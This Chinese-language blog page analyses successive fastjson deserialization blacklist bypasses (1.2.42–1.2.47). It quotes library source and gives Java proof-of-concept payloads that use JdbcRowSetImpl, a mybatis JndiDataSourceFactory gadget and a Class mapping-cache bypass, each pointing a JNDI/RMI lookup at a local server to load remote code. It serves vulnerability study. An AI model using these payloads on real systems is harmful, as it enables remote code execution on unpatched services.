+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
+<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在<strong>1.2.43</strong>的版本中，修复了描述符双写绕过的漏洞</p>
+<p>主要还是在<strong>com.alibaba.fastjson.parser.ParserConfig.checkAutoType</strong>中的判断，修复了多层绕过</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((((BASIC</span><br><span class="line">                ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">        className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>虽然不能双写<strong>L</strong>和**;<strong>绕过了，但是还可以使用</strong>[<strong>和</strong>{**绕过</p>
+<p>添加第一个**[<strong>，变成</strong>“@type”:”[com.sun.rowset.JdbcRowSetImpl”**会报错</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8085/CalcTest&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在<strong>42</strong>列添加第二个**[<strong>，变成</strong>@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[**接着报错</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在<strong>43</strong>列添加**{<strong>，变成</strong>@type”:”[com.sun.rowset.JdbcRowSetImpl”[{**</p>
+<p>成功执行</p>
+<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
+<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h2><p>这个版本主要是修复了使用 <code>[&#123;</code> 绕过黑名单防护的问题</p>
+<p>在<strong>com.alibaba.fastjson.parser.ParserConfig.checkAutoType</strong>中添加了新的判断，检测到类名以**[**开头直接抛出异常</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h2><p>增加了黑名单，存在组件漏洞，需要<strong>mybatis</strong>组件，版本在<strong>3.x.x ~ 3.5.0</strong></p>
+<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>在<strong>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</strong>类下有个<strong>setProperties</strong>方法</p>
+<p>在判断中可以得知，只要<strong>properties</strong>参数中存在<strong>data_source</strong>，可以调用<strong>JNDI</strong>，并传入<strong>data_source</strong>的值</p>
+<p>而且也符合<strong>setter</strong>的要求</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    InitialContext initCtx;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">      initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT)</span><br><span class="line">        &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">      <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">      dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">      dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(<span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
+<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h2><p>这个<strong>Payload</strong>能过绕过<strong>checkAutoType</strong>内的各种检测</p>
+<p>主要是通过<strong>Fastjson</strong>自带的缓存机制将<strong>恶意类</strong>加载到<strong>Mapping</strong>中，从而实现绕过</p>
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="前半——将恶意类写入mapping缓存"><a href="#前半——将恶意类写入mapping缓存" class="headerlink" title="前半——将恶意类写入mapping缓存"></a>前半——将恶意类写入mapping缓存</h4><p>还是关注在<strong>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</strong>上</p>
+<p>首先我们来看一下<strong>autoTypeSupport&#x3D;false</strong>的情况(默认不开启)</p>
+<p>在<strong>autoTypeSupport</strong>不开启的情况下，会先跳过<strong>checkAutoType</strong>中的第一次<strong>黑白名单</strong>检测</p>
+<p>然后在<strong>TypeUtils.mappings</strong>中和<strong>deserializers</strong>中尝试查找要反序列化的类，如果找到了，则就会<strong>return clazz</strong></p>
+<p>这就避开下面<strong>autoTypeSupport&#x3D;false</strong>时的检查</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>而<strong>com.alibaba.fastjson.parser.ParserConfig#initDeserializers</strong>中初始化<strong>deserializers</strong>的时候，会设置很多个类，其中就包括我们需要用到的<strong>java.lang.Class</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">    deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>重点关注在<strong>TypeUtils.getClassFromMapping</strong>方法中</p>
+<p>从<strong>mapping</strong>中获取类名，下面我们就来看看<strong>mapping</strong>是在哪里赋值的，寻找<strong>mapping.put</strong>方法</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>找到是在<strong>com.alibaba.fastjson.util.TypeUtils#loadClass</strong>方法中</p>
+<p>有还几处可以将类加载器加载并存入<strong>mappings</strong>中</p>
+<p>也就是说如果我们可以控制参数的话，那么就有机会往<strong>mappings</strong>中写入<strong>任意类名</strong></p>
+<p>所以，先找一下哪里调用了<strong>loadClass</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到在<strong>com.alibaba.fastjson.serializer.MiscCodec#deserialze</strong>中</p>
+<p>当<strong>clazz &#x3D;&#x3D; Class.class</strong>成立时会调用<strong>loadClass</strong></p>
+<p><strong>clazz</strong>我们可以使用**@type<strong>传入，而</strong>strVal<strong>为我们需要的</strong>className**</p>
+<p>可以看到<strong>strVal</strong>跟<strong>objVal</strong>有关，是强转赋值的</p>
+<p>而<strong>objVal</strong>是在<strong>parser.parse()<strong>中截取而来，且参数名必须为</strong>val</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    Object objVal;</span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="comment">//省略部分代码......</span></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    String strVal;</span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>反过来看一下<strong>com.alibaba.fastjson.serializer.MiscCodec</strong>这个类</p>
+<p>是一个序列化器和反序列化器</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiscCodec</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span>, ObjectDeserializer</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="后半——从mapping中加载恶意类"><a href="#后半——从mapping中加载恶意类" class="headerlink" title="后半——从mapping中加载恶意类"></a>后半——从mapping中加载恶意类</h4><p>当我们第二次进入<strong>checkAutoType()<strong>的时候，就会从</strong>mapping</strong>中获取恶意类</p>
+<h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;1\&quot;:&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;\&quot;2\&quot;:&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</strong></p>
+<ul>
+<li><strong>autoTypeSupport &#x3D;&#x3D; false</strong>可利用</li>
+</ul>
+<p><strong>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</strong></p>
+<ul>
+<li>不论<strong>autoTypeSupport &#x3D;&#x3D; true&#x2F;false</strong>都可利用</li>
+</ul>
+<p>受<strong>autoTypeSupport <strong>的原因还是在</strong>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</strong>上</p>
+<p>当开启<strong>autoTypeSupport</strong>后，黑白名单的<strong>if</strong>判断语句有差异</p>
+<p><strong>1.2.33</strong>版本后，多了句<strong>TypeUtils.getClassFromMapping(typeName) &#x3D;&#x3D; null</strong>，导致不会抛出异常</p>
